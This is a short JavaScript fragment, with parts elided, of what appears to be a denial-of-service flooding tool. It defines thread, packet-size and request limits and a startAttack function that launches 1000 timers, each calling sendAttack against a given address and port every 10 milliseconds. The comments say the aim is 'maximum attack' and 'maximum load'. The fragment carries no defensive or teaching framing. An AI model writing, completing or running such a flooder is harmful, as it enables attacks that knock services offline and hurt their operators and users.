...
const TOKEN = 'TOKEN';
const MAX_QUEUE = 10;
const MAX_THREADS = 1000;  // Increased number of threads
const MAX_DURATION = 300;
const MIN_PACKET_SIZE = 600;
const MAX_PACKET_SIZE = 65000;
const MAX_REQUESTS = 1000;  // Increased requests per thread
...
const startAttack = (address, port, duration) => {
    ...
    const totalThreads = 1000;  // Increased threads for maximum attack

    // Start multiple threads (maximum concurrency)
    for (let i = 0; i < totalThreads; i++) {
        setInterval(() => {
            if (Date.now() > endTime) return;

            sendAttack(address, port); // Send HTTP attack requests
        }, 10);  // Very short interval between requests for maximum load
    }
};
